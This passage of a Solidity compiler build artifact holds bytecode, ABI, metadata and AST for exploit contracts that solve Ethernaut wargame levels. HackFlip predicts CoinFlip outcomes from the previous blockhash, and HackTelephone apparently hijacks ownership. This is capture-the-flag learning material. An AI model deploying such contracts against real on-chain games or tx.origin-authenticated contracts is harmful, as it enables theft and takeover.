23ce5764736f6c634300080a0033",
              "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xCDE4EFA9 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x4E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x4AD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH2 0x7C PUSH32 0x76850F2A41EAA42348812D6D5F1D669A7DFB11E4456B2FB1AD2EB124261E3B82 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0xA8 PUSH32 0x751F14E66C3B71ECDA3F72B84EBEC8AC2372F93BC281773D93B1F8046E4C08CF PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0xD4 PUSH32 0x8D521D8B29D2F7E12007DDC485E4AB5B590C9B8E521741496161F42EC70551FB PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 NUMBER PUSH2 0xE3 SWAP2 SWAP1 PUSH2 0x501 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP PUSH2 0x115 PUSH32 0x662060CD93DB46B0A7870AAD764292E8D8EFF36F707CCE79F22B508DAC3593F4 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x141 PUSH32 0x30F8BB24C4BCE6A057FE33CE23D8BFE6DCBF9D1D8C6CE614F4B7D71C19A58C59 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST DUP1 PUSH1 0x0 SLOAD EQ ISZERO PUSH2 0x1D4 JUMPI PUSH2 0x177 PUSH32 0x80167D4BE857C2E3CE4FBCCEDFCB18AF7434B30A6107850AB7BF176B16B8F3EE PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x1A3 PUSH32 0xF86A990F2D4E49A86608B47806D370C06F946A2A71911CA8570B64AD02228429 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x1CF PUSH32 0x508C7ECDBB5C89E33970B00717FF3BBEC1E8D85C8FA65EE25C9BC441FFA2AEAC PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x200 PUSH32 0xCEBB1F23423D860039ABFDD6DE4EA9CD526F64EAE6C7A2CA43652A28DECB1523 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x22C PUSH32 0xD28650FFF2402B363AA03554769A7F21774984FB04141D96C83AF86B2305A2B8 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x258 PUSH32 0xDD53802A684652E6FF47EEC192D44E459D37AD95E1C80400A099F88BB72DA0AA PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST DUP1 PUSH1 0x0 DUP2 SWAP1 SSTORE POP PUSH2 0x28B PUSH32 0x4F4C27566BFF8B25F7EA94E31751D90AC087CC47EB08DEEB001241CFD48B9480 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x2B7 PUSH32 0xFBB1D0C55E02BB9D893B2A3E06A8C97572BEA0142B4B752219615C1AA3318EB0 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 SLOAD DUP3 PUSH2 0x2C7 SWAP2 SWAP1 PUSH2 0x564 JUMP JUMPDEST SWAP1 POP PUSH2 0x2F5 PUSH32 0x35E1771C990810F7A4C2018DA13FCB98239E42CE66F420DD8968F72A9957C6C PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x321 PUSH32 0x3FFD3EDFD7A0E8CF2CFD60C0EE819ED0865313A37B60C88C09401EF638F5582D PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0x332 JUMPI PUSH1 0x0 PUSH2 0x335 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH2 0x363 PUSH32 0xD317F23FBC045D9B3A1066CD47ED89413E81C540FAC2775C298EB70552C69626 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x38F PUSH32 0x9CBCFDFCF9428C4D31C21C35495F1F73631424EB11249428558DF529A97FBECB PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3EA SWAP2 SWAP1 PUSH2 0x4AD JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x409 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x42D SWAP2 SWAP1 PUSH2 0x5C6 JUMP JUMPDEST POP PUSH2 0x45A PUSH32 0xA8810C2A02E392125A942131B93B61952186ADED9B013761649689B55961B2C0 PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST PUSH2 0x486 PUSH32 0xD6430E7489E14C1CB35138EBEB83AF97CE82ACD80C6A1D113FC554906C61D8FF PUSH1 0x0 SHL PUSH2 0x48F JUMP JUMPDEST DUP1 SWAP4 POP POP POP POP SWAP1 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4A7 DUP2 PUSH2 0x492 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4C2 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x49E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x50C DUP3 PUSH2 0x4C8 JUMP JUMPDEST SWAP2 POP PUSH2 0x517 DUP4 PUSH2 0x4C8 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x52A JUMPI PUSH2 0x529 PUSH2 0x4D2 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x56F DUP3 PUSH2 0x4C8 JUMP JUMPDEST SWAP2 POP PUSH2 0x57A DUP4 PUSH2 0x4C8 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x58A JUMPI PUSH2 0x589 PUSH2 0x535 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x5A3 DUP2 PUSH2 0x492 JUMP JUMPDEST DUP2 EQ PUSH2 0x5AE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x5C0 DUP2 PUSH2 0x59A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x5DC JUMPI PUSH2 0x5DB PUSH2 0x595 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x5EA DUP5 DUP3 DUP6 ADD PUSH2 0x5B1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH1 0x60 0x1E DUP11 0xE2 0xD SELFDESTRUCT 0xEA 0xD 0xD7 PUSH21 0x9AFD8CA348BE79B15BBC939D103D2125E26523CE57 PUSH5 0x736F6C6343 STOP ADDMOD EXP STOP CALLER ",
              "sourceMap": "329:2673:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;770:2229;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;;802:4;809:80;822:66;809:80;;:12;:80::i;:::-;909;922:66;909:80;;:12;:80::i;:::-;1011;1024:66;1011:80;;:12;:80::i;:::-;1110:18;1164:1;1149:12;:16;;;;:::i;:::-;1139:27;1131:36;;1110:57;;1172:80;1185:66;1172:80;;:12;:80::i;:::-;1274;1287:66;1274:80;;:12;:80::i;:::-;1389:10;1377:8;;:22;1373:456;;;1402:80;1415:66;1402:80;;:12;:80::i;:::-;1500;1513:66;1500:80;;:12;:80::i;:::-;1606;1619:66;1606:80;;:12;:80::i;:::-;1705:8;;;1373:456;1732:80;1745:66;1732:80;;:12;:80::i;:::-;1833;1846:66;1833:80;;:12;:80::i;:::-;1935;1948:66;1935:80;;:12;:80::i;:::-;2045:10;2034:8;:21;;;;2058:80;2071:66;2058:80;;:12;:80::i;:::-;2160;2173:66;2160:80;;:12;:80::i;:::-;2259:16;2291:6;;2278:10;:19;;;;:::i;:::-;2259:38;;2300:80;2313:66;2300:80;;:12;:80::i;:::-;2402;2415:66;2402:80;;:12;:80::i;:::-;2501:9;2525:1;2513:8;:13;:28;;2536:5;2513:28;;;2529:4;2513:28;2501:40;;2546:80;2559:66;2546:80;;:12;:80::i;:::-;2648;2661:66;2648:80;;:12;:80::i;:::-;2747:16;;;;;;;;;;;:21;;;2769:4;2747:27;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;2779:80;2792:66;2779:80;;:12;:80::i;:::-;2881;2894:66;2881:80;;:12;:80::i;:::-;2987:4;2980:11;;;;;770:2229;:::o;349:61::-;;:::o;7:90:4:-;41:7;84:5;77:13;70:21;59:32;;7:90;;;:::o;103:109::-;184:21;199:5;184:21;:::i;:::-;179:3;172:34;103:109;;:::o;218:210::-;305:4;343:2;332:9;328:18;320:26;;356:65;418:1;407:9;403:17;394:6;356:65;:::i;:::-;218:210;;;;:::o;434:77::-;471:7;500:5;489:16;;434:77;;;:::o;517:180::-;565:77;562:1;555:88;662:4;659:1;652:15;686:4;683:1;676:15;703:191;743:4;763:20;781:1;763:20;:::i;:::-;758:25;;797:20;815:1;797:20;:::i;:::-;792:25;;836:1;833;830:8;827:34;;;841:18;;:::i;:::-;827:34;886:1;883;879:9;871:17;;703:191;;;;:::o;900:180::-;948:77;945:1;938:88;1045:4;1042:1;1035:15;1069:4;1066:1;1059:15;1086:185;1126:1;1143:20;1161:1;1143:20;:::i;:::-;1138:25;;1177:20;1195:1;1177:20;:::i;:::-;1172:25;;1216:1;1206:35;;1221:18;;:::i;:::-;1206:35;1263:1;1260;1256:9;1251:14;;1086:185;;;;:::o;1358:117::-;1467:1;1464;1457:12;1604:116;1674:21;1689:5;1674:21;:::i;:::-;1667:5;1664:32;1654:60;;1710:1;1707;1700:12;1654:60;1604:116;:::o;1726:137::-;1780:5;1811:6;1805:13;1796:22;;1827:30;1851:5;1827:30;:::i;:::-;1726:137;;;;:::o;1869:345::-;1936:6;1985:2;1973:9;1964:7;1960:23;1956:32;1953:119;;;1991:79;;:::i;:::-;1953:119;2111:1;2136:61;2189:7;2180:6;2169:9;2165:22;2136:61;:::i;:::-;2126:71;;2082:125;1869:345;;;;:::o"
            },
            "methodIdentifiers": {
              "flip()": "cde4efa9"
            }
          },
          "metadata": "{\"compiler\":{\"version\":\"0.8.10+commit.fc410830\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"author\":\"Pedro Reyes\",\"kind\":\"dev\",\"methods\":{\"flip()\":{\"details\":\"Calls CoinFlip.flip method with (true/false) for winning always based on on-chain data\"}},\"title\":\"Contract for hacking CoinFlip.sol in Ethernaut\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"notice\":\"This contract calls CoinFlip.sol and with the right value (true/false) for always winning\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/3_CoinFlip/HackFlip.sol\":\"HackFlip\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":1000},\"remappings\":[]},\"sources\":{\"contracts/3_CoinFlip/CoinFlip.sol\":{\"keccak256\":\"0x2c02e562a4e39d0ab946920dc060b32b4bbeed64df7cb25854f14c458af64ca6\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://92ae3a7e96f4bd24f829c38306bc14c1a7bafb2978d89dd369ac4becf1c8d49b\",\"dweb:/ipfs/Qma9QAB7UnojEmA2foig4vEKxCoX2n27sB2u8qHpU6dtBB\"]},\"contracts/3_CoinFlip/HackFlip.sol\":{\"keccak256\":\"0x966da20d4112a0b71d0dca2ade675f303a98e0ba19ccd080b92afedfb07f4a23\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://453700ef1eac8decc4f93c9c5dd4547dc1931c414bc6ca45fbc570b79cbd6dbd\",\"dweb:/ipfs/QmPPaa7DEuWaiLqLZUiZ9qjbZpJSrtLWxhwkyWubm7hCNZ\"]}},\"version\":1}"
        }
      },
      "contracts/4_Telephone/HackTelephone.sol": {
        "HackTelephone": {
          "abi": [
            {
              "inputs": [
                {
                  "internalType": "address",
                  "name": "_address",
                  "type": "address"
                }
              ],
              "stateMutability": "nonpayable",
              "type": "constructor"
            },
            {
              "inputs": [
                {
                  "internalType": "address",
                  "name": "_owner",
                  "type": "address"
                }
              ],
              "name": "changeOwner",
              "outputs": [],
              "stateMutability": "nonpayable",
              "type": "function"
            }
          ],
          "evm": {
            "bytecode": {
              "functionDebugData": {
                "@_218": {
                  "entryPoint": null,
                  "id": 218,
                  "parameterSlots": 1,
                  "returnSlots": 0
                },
                "@c_0x57d152bd_191": {
                  "entryPoint": 270,
                  "id": 191,
                  "parameterSlots": 1,
                  "returnSlots": 0
                },
                "abi_decode_t_address_fromMemory": {
                  "entryPoint": 351,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 1
                },
                "abi_decode_tuple_t_address_fromMemory": {
                  "entryPoint": 372,
                  "id": null,
                  "parameterSlots": 2,
                  "returnSlots": 1
                },
                "allocate_unbounded": {
                  "entryPoint": null,
                  "id": null,
                  "parameterSlots": 0,
                  "returnSlots": 1
                },
                "cleanup_t_address": {
                  "entryPoint": 310,
                  "id": null,
                  "parameterSlots": 1,
                  "returnSlots": 1
                },
                "cleanup_t_uint160": {
                  "entryPoint": 278,
                  "id": null,
                  "parameterSlots": 1,
                  "returnSlots": 1
                },
                "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
                  "entryPoint": null,
                  "id": null,
                  "parameterSlots": 0,
                  "returnSlots": 0
                },
                "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
                  "entryPoint": 273,
                  "id": null,
                  "parameterSlots": 0,
                  "returnSlots": 0
                },
                "validator_revert_t_address": {
                  "entryPoint": 328,
                  "id": null,
                  "parameterSlots": 1,
                  "returnSlots": 0
                }
              },
              "generatedSources": [
                {
                  "ast": {
                    "nodeType": "YulBlock",
                    "src": "0:1199:4",
                    "statements": [
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "47:35:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "57:19:4",
                              "value": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "73:2:4",
                                    "type": "",
                                    "value": "64"
                                  }
                                ],
                                "functionName": {
                                  "name": "mload",
                                  "nodeType": "YulIdentifier",
                                  "src": "67:5:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "67:9:4"
                              },
                              "variableNames": [
                                {
                                  "name": "memPtr",
                                  "nodeType": "YulIdentifier",
                                  "src": "57:6:4"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "allocate_unbounded",
                        "nodeType": "YulFunctionDefinition",
                        "returnVariables": [
                          {
                            "name": "memPtr",
                            "nodeType": "YulTypedName",
                            "src": "40:6:4",
                            "type": ""
                          }
                        ],
                        "src": "7:75:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "177:28:4",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "194:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "197:1:4",
                                    "type": "",
                                    "value": "0"
                                  }
                                ],
                                "functionName": {
                                  "name": "revert",
                                  "nodeType": "YulIdentifier",
                                  "src": "187:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "187:12:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "187:12:4"
                            }
                          ]
                        },
                        "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
                        "nodeType": "YulFunctionDefinition",
                        "src": "88:117:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "300:28:4",
                          "statements": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "317:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "320:1:4",
                                    "type": "",
                                    "value": "0"
                                  }
                                ],
                                "functionName": {
                                  "name": "revert",
                                  "nodeType": "YulIdentifier",
                                  "src": "310:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "310:12:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "310:12:4"
                            }
                          ]
                        },
                        "name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
                        "nodeType": "YulFunctionDefinition",
                        "src": "211:117:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "379:81:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "389:65:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "value",
                                    "nodeType": "YulIdentifier",
                                    "src": "404:5:4"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "411:42:4",
                                    "type": "",
                                    "value": "0xffffffffffffffffffffffffffffffffffffffff"
                                  }
                                ],
                                "functionName": {
                                  "name": "and",
                                  "nodeType": "YulIdentifier",
                                  "src": "400:3:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "400:54:4"
                              },
                              "variableNames": [
                                {
                                  "name": "cleaned",
                                  "nodeType": "YulIdentifier",
                                  "src": "389:7:4"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "cleanup_t_uint160",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "361:5:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "cleaned",
                            "nodeType": "YulTypedName",
                            "src": "371:7:4",
                            "type": ""
                          }
                        ],
                        "src": "334:126:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "511:51:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "521:35:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "value",
                                    "nodeType": "YulIdentifier",
                                    "src": "550:5:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "cleanup_t_uint160",
                                  "nodeType": "YulIdentifier",
                                  "src": "532:17:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "532:24:4"
                              },
                              "variableNames": [
                                {
                                  "name": "cleaned",
                                  "nodeType": "YulIdentifier",
                                  "src": "521:7:4"
                                }
                              ]
                            }
                          ]
                        },
                        "name": "cleanup_t_address",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "493:5:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "cleaned",
                            "nodeType": "YulTypedName",
                            "src": "503:7:4",
                            "type": ""
                          }
                        ],
                        "src": "466:96:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "611:79:4",
                          "statements": [
                            {
                              "body": {
                                "nodeType": "YulBlock",
                                "src": "668:16:4",
                                "statements": [
                                  {
                                    "expression": {
                                      "arguments": [
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "677:1:4",
                                          "type": "",
                                          "value": "0"
                                        },
                                        {
                                          "kind": "number",
                                          "nodeType": "YulLiteral",
                                          "src": "680:1:4",
                                          "type": "",
                                          "value": "0"
                                        }
                                      ],
                                      "functionName": {
                                        "name": "revert",
                                        "nodeType": "YulIdentifier",
                                        "src": "670:6:4"
                                      },
                                      "nodeType": "YulFunctionCall",
                                      "src": "670:12:4"
                                    },
                                    "nodeType": "YulExpressionStatement",
                                    "src": "670:12:4"
                                  }
                                ]
                              },
                              "condition": {
                                "arguments": [
                                  {
                                    "arguments": [
                                      {
                                        "name": "value",
                                        "nodeType": "YulIdentifier",
                                        "src": "634:5:4"
                                      },
                                      {
                                        "arguments": [
                                          {
                                            "name": "value",
                                            "nodeType": "YulIdentifier",
                                            "src": "659:5:4"
                                          }
                                        ],
                                        "functionName": {
                                          "name": "cleanup_t_address",
                                          "nodeType": "YulIdentifier",
                                          "src": "641:17:4"
                                        },
                                        "nodeType": "YulFunctionCall",
                                        "src": "641:24:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "eq",
                                      "nodeType": "YulIdentifier",
                                      "src": "631:2:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "631:35:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "iszero",
                                  "nodeType": "YulIdentifier",
                                  "src": "624:6:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "624:43:4"
                              },
                              "nodeType": "YulIf",
                              "src": "621:63:4"
                            }
                          ]
                        },
                        "name": "validator_revert_t_address",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "604:5:4",
                            "type": ""
                          }
                        ],
                        "src": "568:122:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "759:80:4",
                          "statements": [
                            {
                              "nodeType": "YulAssignment",
                              "src": "769:22:4",
                              "value": {
                                "arguments": [
                                  {
                                    "name": "offset",
                                    "nodeType": "YulIdentifier",
                                    "src": "784:6:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "mload",
                                  "nodeType": "YulIdentifier",
                                  "src": "778:5:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "778:13:4"
                              },
                              "variableNames": [
                                {
                                  "name": "value",
                                  "nodeType": "YulIdentifier",
                                  "src": "769:5:4"
                                }
                              ]
                            },
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "name": "value",
                                    "nodeType": "YulIdentifier",
                                    "src": "827:5:4"
                                  }
                                ],
                                "functionName": {
                                  "name": "validator_revert_t_address",
                                  "nodeType": "YulIdentifier",
                                  "src": "800:26:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "800:33:4"
                              },
                              "nodeType": "YulExpressionStatement",
                              "src": "800:33:4"
                            }
                          ]
                        },
                        "name": "abi_decode_t_address_fromMemory",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "offset",
                            "nodeType": "YulTypedName",
                            "src": "737:6:4",
                            "type": ""
                          },
                          {
                            "name": "end",
                            "nodeType": "YulTypedName",
                            "src": "745:3:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "value",
                            "nodeType": "YulTypedName",
                            "src": "753:5:4",
                            "type": ""
                          }
                        ],
                        "src": "696:143:4"
                      },
                      {
                        "body": {
                          "nodeType": "YulBlock",
                          "src": "922:274:4",
                          "statements": [
                            {
                              "body": {
                                "nodeType": "YulBlock",
                                "src": "968:83:4",
                                "statements": [
                                  {
                                    "expression": {
                                      "arguments": [],
                                      "functionName": {
                                        "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
                                        "nodeType": "YulIdentifier",
                                        "src": "970:77:4"
                                      },
                                      "nodeType": "YulFunctionCall",
                                      "src": "970:79:4"
                                    },
                                    "nodeType": "YulExpressionStatement",
                                    "src": "970:79:4"
                                  }
                                ]
                              },
                              "condition": {
                                "arguments": [
                                  {
                                    "arguments": [
                                      {
                                        "name": "dataEnd",
                                        "nodeType": "YulIdentifier",
                                        "src": "943:7:4"
                                      },
                                      {
                                        "name": "headStart",
                                        "nodeType": "YulIdentifier",
                                        "src": "952:9:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "sub",
                                      "nodeType": "YulIdentifier",
                                      "src": "939:3:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "939:23:4"
                                  },
                                  {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "964:2:4",
                                    "type": "",
                                    "value": "32"
                                  }
                                ],
                                "functionName": {
                                  "name": "slt",
                                  "nodeType": "YulIdentifier",
                                  "src": "935:3:4"
                                },
                                "nodeType": "YulFunctionCall",
                                "src": "935:32:4"
                              },
                              "nodeType": "YulIf",
                              "src": "932:119:4"
                            },
                            {
                              "nodeType": "YulBlock",
                              "src": "1061:128:4",
                              "statements": [
                                {
                                  "nodeType": "YulVariableDeclaration",
                                  "src": "1076:15:4",
                                  "value": {
                                    "kind": "number",
                                    "nodeType": "YulLiteral",
                                    "src": "1090:1:4",
                                    "type": "",
                                    "value": "0"
                                  },
                                  "variables": [
                                    {
                                      "name": "offset",
                                      "nodeType": "YulTypedName",
                                      "src": "1080:6:4",
                                      "type": ""
                                    }
                                  ]
                                },
                                {
                                  "nodeType": "YulAssignment",
                                  "src": "1105:74:4",
                                  "value": {
                                    "arguments": [
                                      {
                                        "arguments": [
                                          {
                                            "name": "headStart",
                                            "nodeType": "YulIdentifier",
                                            "src": "1151:9:4"
                                          },
                                          {
                                            "name": "offset",
                                            "nodeType": "YulIdentifier",
                                            "src": "1162:6:4"
                                          }
                                        ],
                                        "functionName": {
                                          "name": "add",
                                          "nodeType": "YulIdentifier",
                                          "src": "1147:3:4"
                                        },
                                        "nodeType": "YulFunctionCall",
                                        "src": "1147:22:4"
                                      },
                                      {
                                        "name": "dataEnd",
                                        "nodeType": "YulIdentifier",
                                        "src": "1171:7:4"
                                      }
                                    ],
                                    "functionName": {
                                      "name": "abi_decode_t_address_fromMemory",
                                      "nodeType": "YulIdentifier",
                                      "src": "1115:31:4"
                                    },
                                    "nodeType": "YulFunctionCall",
                                    "src": "1115:64:4"
                                  },
                                  "variableNames": [
                                    {
                                      "name": "value0",
                                      "nodeType": "YulIdentifier",
                                      "src": "1105:6:4"
                                    }
                                  ]
                                }
                              ]
                            }
                          ]
                        },
                        "name": "abi_decode_tuple_t_address_fromMemory",
                        "nodeType": "YulFunctionDefinition",
                        "parameters": [
                          {
                            "name": "headStart",
                            "nodeType": "YulTypedName",
                            "src": "892:9:4",
                            "type": ""
                          },
                          {
                            "name": "dataEnd",
                            "nodeType": "YulTypedName",
                            "src": "903:7:4",
                            "type": ""
                          }
                        ],
                        "returnVariables": [
                          {
                            "name": "value0",
                            "nodeType": "YulTypedName",
                            "src": "915:6:4",
                            "type": ""
                          }
                        ],
                        "src": "845:351:4"
                      }
                    ]
                  },
